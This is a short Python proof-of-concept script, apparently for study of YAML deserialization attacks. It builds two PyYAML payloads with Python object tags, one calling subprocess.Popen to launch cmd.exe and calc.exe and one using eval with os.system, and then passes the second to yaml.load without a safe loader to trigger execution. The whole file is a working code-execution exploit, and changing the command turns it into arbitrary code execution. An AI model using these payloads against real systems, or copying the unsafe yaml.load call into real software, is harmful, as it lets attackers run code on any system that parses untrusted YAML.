#!/usr/bin/env python
# -*- coding: utf-8 -*-

import yaml
import flask

poc = """!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cmd.exe
  - /c
  - calc.exe"""

poc2 = """!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ "__import__('os').system('calc.exe')" ]"""

# LearningYaml.load(poc, Loader=LearningYaml.Loader)
yaml.load(poc2)
